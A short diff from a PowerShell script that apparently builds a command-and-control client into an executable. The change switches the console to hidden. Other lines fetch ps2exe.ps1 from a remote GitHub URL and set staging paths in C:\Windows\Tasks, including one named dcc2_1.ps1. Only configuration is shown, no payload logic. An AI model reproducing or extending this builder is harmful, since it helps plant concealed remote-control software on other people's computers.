@@ -9,7 +9,7 @@ Run this script and input the relevant info, then click build and run the exe on
 
 #>
 
-$hidewindow = 0 # 1 = Hidden Console, 2 = Show Console
+$hidewindow = 1 # 1 = Hidden Console, 2 = Show Console
 $ps2exe = "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/ps2exe.ps1"
 $tempps2exe = "C:\Windows\Tasks\ps2exe.ps1"
 $tempc2client = "C:\Windows\Tasks\dcc2_1.ps1"
